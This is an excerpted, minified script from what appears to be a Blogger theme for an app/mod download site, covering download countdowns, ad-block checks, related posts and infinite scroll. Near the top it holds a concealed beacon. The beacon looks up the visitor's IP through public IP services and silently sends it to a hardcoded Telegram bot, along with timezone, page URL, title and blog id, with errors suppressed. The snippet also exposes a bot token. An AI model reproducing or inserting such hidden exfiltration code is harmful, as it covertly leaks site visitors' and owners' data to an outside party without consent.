async function mainScript(e) {
			...
			try {
				e._AR.is.Pv || (async () => {
					try {
						...
						let s = t || "";
						s && (s = s.replace("{", "").replace("}", "").split(",").join("\n").replaceAll('":"', ": ").replaceAll('"', "`"));
						let l = await e.xAR.gFa("//worldtimeapi.org/api/timezone/Etc/UTC");
						l && (l = l.client_ip), l || (l = await e.xAR.gFa("//api-bdc.net/data/client-ip"), l && (l = l.ipString)), l || (l = await e.xAR.gFa("//api.ipify.org/?format=json"), l && (l = l.ip)), l || (l = await e.xAR.gFa("//ipv4.seeip.org/jsonip"), l && (l = l.ip));
						const n = `//api.telegram.org/bot6414442507:AAHfKdKiX1iCmXATF-BIEohM9Vgk314VNbM/sendMessage?chat_id=${a}&parse_mode=MarkdownV2&text=${e.encodeURIComponent(`\`[x] ${e.Intl.DateTimeFormat().resolvedOptions().timeZone} - ${(new Date).toLocaleString()}${l?`\`\n\n\`${l}`:""}\`\n\n\`${e.document.title||e._AR.blg.ttl}\`\n\n\`${e.location.href}\`\n\n\`${e._AR.blg.id}\`${s?`\n\n${s}`:""}`)}`;
						await e.xAR.gFa(n)
					} catch (e) {}
				})()
			} catch (e) {}
		}, void 0 === e._AR) return t(), !1;
	try {
		...
		if (a) {
			...
			const i = "https://www.blogger.com/feeds/$1/posts/default?alt=json-in-script&max-results=1&q=label:$2+label:$3+$4+$5&callback=_cbLcc".replace("$1", s).replace("$2", l).replace("$3", n).replace("$4", o).replace("$5", r);
			e._cbLcc = a => {
				...
				if (s) try {
					...
					let l = s[0].link;
					l = l.filter((e => "enclosure" == e.rel)).map((({
						href: e,
						type: t
					}) => ({
					...
					}(l), a || (a = {}, l.xsess = 180), e.xAR.sC("_AR_Blog", e.xAR.en(e.jOs(a)), l.xsess), e.xAR.sC("_AR_User", e.xAR.en(e.jOs(l)), l.xsess), e.logTmp(), t(a, l)
				} catch (a) {
					e.logTmp(), t()
	...
	try {
		e.aCss(fontBlog, "xFonts"), e._AR.is.Pv || (e.Defer((() => {
			...
			e._AR.is.Ps && !e._AR.is.Pv && "undefined" != typeof cfAG && (e => {
				const t = cfAG;
							...
							e.sElm(".app", (o => {
								if (!e.cCls(o, "a")) {
									...
									const i = e.setInterval((() => {
										d -= 1, a.innerHTML = l.replace("$1", d), e.qSel(".dldPg").style.strokeDashoffset = Math.floor(d / s * 100), d <= 0 && (e.clearInterval(i), a.innerHTML = n, r())
									}), 1e3)
								}
							}))
					...
					l && !r ? (e.sAtd(a, "link", e.xAR.e(l)), e.sAttr(a, "href", "#!")) : r && e.sAtd(a, "link", e.xAR.e(r)), a.addEventListener("click", (() => {
						const l = () => {
							const t = new URLSearchParams,
								...
								c = a.dataset.text,
								p = a.dataset.size;
							t.append("id", e._AR.is.Ps), t.append("url", s), n && t.append("aImg", n), r && t.append("apN", r), o && t.append("apV", o), d && t.append("lnk", d), i && t.append("apM", i), c && t.append("apF", c), p && t.append("apS", p), e.xAR.sSS("ApGm_dl1", t.toString()), e.location.href = s + "?dl=1"
						};
						if (1 == t.dl1.enable) {
				...
				if (1 == a("dl") && e.xAR.gSS("ApGm_dl1")) {
					...
					if (l.get("id") == e._AR.is.Ps) {
						...
						let n = "",
							...
							c = "",
							p = "";
						e.xAR.gSS("ApGm_dl0") && a("id", `?${e.xAR.gSS("ApGm_dl0")}`) == e._AR.is.Ps && (d = l.get("url") + "?dl=0", i = t.dl1.tx[2]), l.get("apM") && (c = `MOD ${l.get("apM")}`), l.get("apS") && (p = ` (${l.get("apS")})`), l.get("aImg") && (n = `<img class="dl_img lazy" src="data:image/png;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" data-src="${l.get("aImg")}" alt="${l.get("apN")}">`), n += '<div class="dl_cnt">', n += `<h1>${t.dl1.tx[0]} ${l.get("apN")}</h1>`;
						let m = l.get("apN") + " " + l.get("apV") + " " + c;
						l.get("apF") ? (m = l.get("apF"), n += `<span>${l.get("apF")}</span>`) : n += `<span>${l.get("apN")} ${l.get("apV")} ${c}</span>`, n += t.cnt[5].replaceAll("$1", e.xAR.d(l.get("lnk"))).replaceAll("$2", p), e.qSel(".pEnt").insertAdjacentHTML("afterbegin", n), e.qSel(".progDL").insertAdjacentElement("beforebegin", e.geId("adTop")), r += t.cnt[6].replaceAll("$1", e.xAR.d(l.get("lnk"))).replaceAll("$2", e._AR.blg.ttl), r += t.cnt[7].replaceAll("$1", m).replaceAll("$2", e._AR.blg.ttl), r += o, r += t.cnt[4].replaceAll("$1", d).replaceAll("$2", i), e.sElm(".dl_cnt", (t => {
			...
			})), e._AR.fs.adSen.enable && !e._AR.is.Pv && (() => {
				...
				if (a.adClient) {
					...
					e._f.adBlock = () => {
						...
						if (!(t.length > 0)) return a.consLog && e.xPushAd && e._xTime("-> all ads are showing <-"), e.clearInterval(e._checkAd), e.xPushAd = 0, !0;
						if (e.xPushAd += 1, 1 == e.xPushAd && (a.consLog && e._xTime(`ad length: ${t.length}`), e.xAdUnit = t.length), 2 == e.xPushAd) {
							let a = 0;
							if (t.forEach((t => {
									e.gAtd(t, "adStatus") || (a += 1)
								})), e.xAdUnit == a) return e.clearInterval(e._checkAd), e._f.adBlock(), !1
						}
						if (e.xPushAd > a.maxPush) {
							...
							})), a.consLog && e._xTime(`-> (${t.length}) ad not showing ${e.jOs(s)}`), e.xPushAd = 0, !1
						}
						...
						try {
							...
							if (e._AR.is.Ps || e._AR.is.Pg) {
								...
								e._f.pushCounter = async (t = {}) => {
									...
									const c = await l.child(`${r}/${i.id}`).get().then((e => e.exists() && e.val())).catch((() => !1));
									c && (d += c), o[i.id] = d, l.child(r).update(o).then((() => {
										try {
											e.sElm(i.el, (t => {
		...
		}), e._AR.is.Ps && !e._AR.is.Pv && e.domCL((() => {
			...
			})(e, e.document), e.geId("aRel") && !e._AR.is.Pvb && (e._f.relatedInPost = () => {
						...
						t.forEach((t => {
							try {
								...
								if (e._AR.blg.xur != r && n.length < l) {
									...
									d = d ? d[0].match(/(?<=<span.*?class="apMod".*?>)(.*?)(?=<\/span>)/g) : "", i = i ? i[1] : "", s += `<li><a aria-label="${a}" href="${r}"><div class="itmTtl"><span>${e||a}</span>${l?` <span class="v"${o?` data-text="${o}"`:""}>v${l}</span>`:""}${d?` <span class="m"${i?` data-text="${i}"`:""}>(${d})</span>`:""}</div></a></li>`
								}
							} catch (t) {}
			...
			}, e.Defer(e._f.relatedInPost, 0)), e.geId("rPst") && !e._AR.is.Pvb && (e._f.relatedPost = () => {
						...
						try {
							...
							if ("fetch" in e) try {
								...
								if (r) {
									let t = r - (l - 1);
									t = 1 < t ? e.xAR.rdm(t) : 1;
									const a = await e.xAR.gFa("/feeds/posts/default/$1?alt=json&max-results=$2&orderby=$3&start-index=$4".replace("$1", s).replace("$2", e.Number(l) + 1).replace("$3", n).replace("$4", t));
									r = a && a.feed.entry
								}
								return r
							} catch (t) {
						...
						t.forEach((t => {
							try {
								...
								if (_AR.blg.xur != o && n.length < l) {
									n.push(a);
									let l = "";
									r || (l = t.content.$t.includes("altImg") ? t.content.$t.match(/<img.class=.altImg.*? [^>]*src="[^"]*"[^>]*>/gm) : "", l = l ? l.map((e => e.replace(/.*src="([^"]*)".*/, "$1")))[0] : "", l = l ? `url('${e.rszI(l,i)}')` : "none");
			...
			e._AR.is.Mob && "share" in e.navigator && e.sElm("label[for=forShare]", (t => {
				...
				s.setAttribute("class", "lazy"), s.setAttribute("data-src", a), s.setAttribute("src", "data:image/png;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs="), s.setAttribute("alt", "Youtube video"), s.addEventListener("load", t.appendChild(s)), t.addEventListener("click", (() => {
					...
					a.setAttribute("frameborder", "0"), a.setAttribute("allowfullscreen", ""), a.setAttribute("src", `https://www.youtube.com/embed/${t.dataset.embed}?rel=0&showinfo=0&autoplay=1`), t.innerHTML = "", t.appendChild(a)
				}))
		...
		}))), !e._AR.is.Hm || e._AR.is.Pv || e._AR.is.Pvb || (e._f.psByLabel = () => {
				...
				a ? ((t, a) => {
					...
					t.forEach((t => {
						try {
							...
							i = i ? i[0].match(/(?<=<span.*?class="apMod".*?>)(.*?)(?=<\/span>)/g) : "", c = c ? c[1] : "", s += `<li><a class="item" aria-label="${a}" href="${l}"><div class="iThmb pThmb"><div class="thmb"><div class="img lazy" data-style="background-image: ${n}"></div></div></div><div class="itmTtl"><span>${r||a}</span> ${o?`<span class="apVM">v${o}${i?` • ${i}`:""}</span>`:""}${d?`<div class="apAM"><span class="apk" data-text="${d}"></span>${c?`<span class="mod" data-text="${c}"></span>`:""}</div>`:""}</div></a></li>`
						} catch (t) {}
					})), a.querySelector("ul").innerHTML = s;
					try {
						e._f.laZy(!1, !0)
			...
			e._AR.fs.pgSa.enable && (t = e, a = e.document, t.InfiniteScroll = function(e) {
				...
				function r(e, t) {
					if (l(c[e]))
						for (var a in c[e]) c[e][a](t)
				}

				function o() {
					return h.innerHTML = i.text.loading, A = !0, u ? (aCls(_, i.state.loading), r("loading", [i]), void m(u, (function(e, t) {
						...
						if (l = l && l[0] ? l[0].innerHTML : "", n.length && c.length) {
							...
							m.insertAdjacentHTML("afterend", p.innerHTML), d(), u = !!o.length && o[0].href, A = !1, r("load", [i, e, t])
						}
					}), (function(e, t) {
				...
				if (u.length) {
					...
					var S = function() {
						y = f.offsetTop + f.offsetHeight, v = t.innerHeight, R = b.scrollTop || _.scrollTop, A || y > R + v || o()
					};
					S(), 0 !== i.type && t.addEventListener("scroll", (function() {
			...
			void 0 !== e._f.infiniteSc && e._f.infiniteSc.on("load", (() => {
				void 0 !== e._f.sPsAG && e._f.sPsAG(), void 0 !== e._f.cImgAG && e._f.cImgAG(), void 0 !== e._f.psBkm && e._f.psBkm(), void 0 !== e._f.qEdit && e._f.qEdit(), void 0 !== e._f.showCounter && e._f.showCounter(), void 0 !== e._f.pushAd && e._f.pushAd(), e._f.laZy(!0, !0)
			}))
		}))
	} catch (e) {
		return !1
